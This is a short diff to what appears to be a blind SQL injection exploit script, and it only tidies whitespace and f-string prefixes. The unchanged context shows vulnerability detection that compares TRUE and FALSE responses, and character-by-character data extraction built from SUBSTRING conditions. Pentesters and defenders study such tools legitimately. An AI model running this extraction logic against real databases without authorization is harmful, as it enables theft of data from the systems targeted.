@@ -57,16 +57,16 @@ def check_vulnerability(target):
     if len_true is not None and len_false is not None:
         print(f"[*] TRUE condition:  HTTP {status_true}, Response length: {len_true}")
         print(f"[*] FALSE condition: HTTP {status_false}, Response length: {len_false}")
-        
+
         # Check for differences in response length
         if len_true != len_false:
-            print(f"[+] VULNERABLE! Different response lengths detected:")
+            print("[+] VULNERABLE! Different response lengths detected:")
             print(f"    TRUE condition:  {len_true} bytes")
             print(f"    FALSE condition: {len_false} bytes")
             return True, len_true
         # Fallback: check status codes
         elif status_true != status_false:
-            print(f"[+] VULNERABLE! Different HTTP status codes detected:")
+            print("[+] VULNERABLE! Different HTTP status codes detected:")
             print(f"    TRUE condition:  HTTP {status_true}")
             print(f"    FALSE condition: HTTP {status_false}")
             return True, status_true
@@ -96,7 +96,7 @@ def extract_data(target, query, true_marker, max_length=64):
                 f"SUBSTRING(({query}),{pos},1)='{char}'"
             )
             length, status = test_sqli(target, condition)
-            
+
             # Check if this character matches (compare with true_marker)
             if isinstance(true_marker, int) and length == true_marker:
                 result += char
